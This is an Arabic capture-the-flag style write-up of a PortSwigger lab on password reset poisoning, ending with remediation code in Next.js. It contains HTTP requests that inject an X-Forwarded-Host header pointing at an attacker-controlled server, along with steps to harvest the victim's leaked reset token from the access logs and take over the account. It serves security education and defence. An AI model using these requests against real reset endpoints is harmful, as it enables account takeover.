# Lab: Password reset poisoning via middleware

> **Category:** Authentication  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة **Password Reset Poisoning** حيث يدعم الخادم هيدر `X-Forwarded-Host` لإنشاء رابط إعادة تعيين كلمة المرور ديناميكياً. يمكننا توجيه الرابط إلى خادم الاستغلال الخاص بنا، وعندما يرسل `carlos` طلب إعادة تعيين، سيتم تسريب رمز إعادة التعيين (reset token) إلينا.

**المعطيات:**
- حسابنا: `wiener:peter`
- حساب الضحية: `carlos`

**المطلوب:** الحصول على رمز إعادة تعيين `carlos`، تغيير كلمة مروره، ثم تسجيل الدخول بحسابه.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم آلية إعادة تعيين كلمة المرور

- اضغط على **Forgot your password?**
- أدخل اسم المستخدم الخاص بك (`wiener`)
- ستتلقى بريداً إلكترونياً يحتوي على رابط إعادة التعيين:

```
https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=TOKEN_VALUE
```

### الخطوة 2: اعتراض طلب إعادة التعيين

- في Burp، ابحث عن طلب `POST /forgot-password`
- أرسله إلى **Repeater**

```http
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

### الخطوة 3: اختبار هيدر X-Forwarded-Host

- أضف هيدر `X-Forwarded-Host` إلى الطلب:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: example.com
Content-Type: application/x-www-form-urlencoded

username=wiener
```

- أرسل الطلب
- اذهب إلى **Email client**

**النتيجة:** رابط إعادة التعيين أصبح:

```
https://example.com/forgot-password?temp-forgot-password-token=TOKEN
```

### الخطوة 4: توجيه الرابط إلى خادم الاستغلال الخاص بنا

- استخدم عنوان خادم الاستغلال الخاص بك:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

- أرسل الطلب

### الخطوة 5: مراقبة سجلات خادم الاستغلال

- اذهب إلى **Exploit server** → **Access log**
- ستجد طلباً مثل:

```
GET /forgot-password?temp-forgot-password-token=xyz123abc456def789
```

### الخطوة 6: استخراج رمز إعادة التعيين

- انسخ قيمة `temp-forgot-password-token` من السجل

### الخطوة 7: بناء رابط إعادة التعيين الصحيح

- استخدم الرابط الأصلي من التطبيق (بدون خادم الاستغلال):

```
https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=XYZ_TOKEN
```

- استبدل `XYZ_TOKEN` بالرمز الذي سرقته من `carlos`

### الخطوة 8: تغيير كلمة مرور carlos

- افتح الرابط في المتصفح
- أدخل كلمة مرور جديدة لحساب `carlos`

### الخطوة 9: تسجيل الدخول بحساب carlos

- استخدم اسم المستخدم `carlos` وكلمة المرور الجديدة لتسجيل الدخول

### الخطوة 10: حل المختبر

بعد تسجيل الدخول، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Password Reset Poisoning؟** | ثغرة تسمح للمهاجم بتغيير الرابط المرسل في بريد إعادة تعيين كلمة المرور باستخدام هيدر `X-Forwarded-Host` |
| **كيف تعمل؟** | الخادم يثق في `X-Forwarded-Host` لإنشاء الرابط الديناميكي |
| **كيف نستغلها؟** | نطلب إعادة تعيين لـ `carlos` مع `X-Forwarded-Host`指向 خادمنا، فيُرسل الرابط إلينا |
| **لماذا ينقر carlos على الرابط؟** | العبارة: "The user carlos will carelessly click on any links in emails that he receives" |

---

## 📊 شرح آلية الهجوم

```
1. المهاجم يرسل POST /forgot-password
   Host: lab.com
   X-Forwarded-Host: attacker.net
   username=carlos

2. الخادم يرسل بريداً إلى carlos:
   "Click here to reset: https://attacker.net/forgot-password?token=XYZ"

3. carlos ينقر على الرابط → يرسل طلباً إلى خادم المهاجم
   GET https://attacker.net/forgot-password?token=XYZ

4. المهاجم يستخرج token ويستخدمه لتغيير كلمة مرور carlos
   https://lab.com/forgot-password?token=XYZ
```

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يثق في هيدر `X-Forwarded-Host` (أو `Host`) القادم من المستخدم لإنشاء روابط ديناميكية، مما يسمح بتوجيه الضحية إلى خادم المهاجم.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/forgot-password.js
export default function handler(req, res) {
  const { username } = req.body;
  
  // خطأ: استخدام X-Forwarded-Host من المستخدم
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const token = generateResetToken(username);
  
  // إنشاء رابط يعتمد على هيدر غير موثوق
  const resetLink = `https://${host}/forgot-password?temp-forgot-password-token=${token}`;
  
  // إرسال الرابط إلى المستخدم
  sendEmail(username, `Reset your password: ${resetLink}`);
  
  res.json({ success: true });
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/forgot-password.js
export default function handler(req, res) {
  const { username } = req.body;
  
  // التصحيح 1: استخدام نطاق ثابت (hardcoded) بدلاً من هيدرات المستخدم
  const trustedHost = process.env.TRUSTED_HOST || 'YOUR-LAB-ID.web-security-academy.net';
  
  // التصحيح 2: تجاهل أي هيدرات من المستخدم
  const token = generateResetToken(username);
  
  // التصحيح 3: إنشاء رابط من نطاق موثوق فقط
  const resetLink = `https://${trustedHost}/forgot-password?temp-forgot-password-token=${token}`;
  
  sendEmail(username, `Reset your password: ${resetLink}`);
  
  res.json({ success: true });
}
```

```javascript
// middleware/trusted-hosts.js - منع هيدرات غير موثوقة
export function trustedHostsMiddleware(req, res, next) {
  const allowedHosts = [
    'YOUR-LAB-ID.web-security-academy.net',
    'localhost'
  ];
  
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  
  // التصحيح 4: رفض أي نطاق غير مصرح به
  if (!allowedHosts.includes(host)) {
    return res.status(400).json({ error: 'Invalid host header' });
  }
  
  // التصحيح 5: إزالة X-Forwarded-Host من الطلب
  delete req.headers['x-forwarded-host'];
  
  next();
}
```

**الخلاصة:** 
1. لا تستخدم أبداً `X-Forwarded-Host` أو `Host` من المستخدم لإنشاء روابط
2. استخدم نطاقاً ثابتاً (hardcoded) موثوقاً
3. قم بتكوين الخادم لإزالة أو تجاهل الهيدرات غير الموثوقة

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **نطاق ثابت (Hardcoded host)** | استخدم نطاقاً محدداً مسبقاً لإنشاء الروابط |
| **تجاهل X-Forwarded-Host** | لا تثق أبداً في هذا الهيدر من المستخدم |
| **التحقق من النطاق** | ارفض أي نطاق غير مصرح به |
| **استخدام variables بيئة آمنة** | خزّن النطاق الموثوق في متغير بيئة |
| **تكوين الخادم** | قم بإزالة الهيدرات غير الموثوقة في proxy/lb |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
- [Password Reset Poisoning](https://portswigger.net/web-security/authentication/other-mechanisms#password-reset-poisoning)
- [Host Header Injection](https://portswigger.net/web-security/host-header)
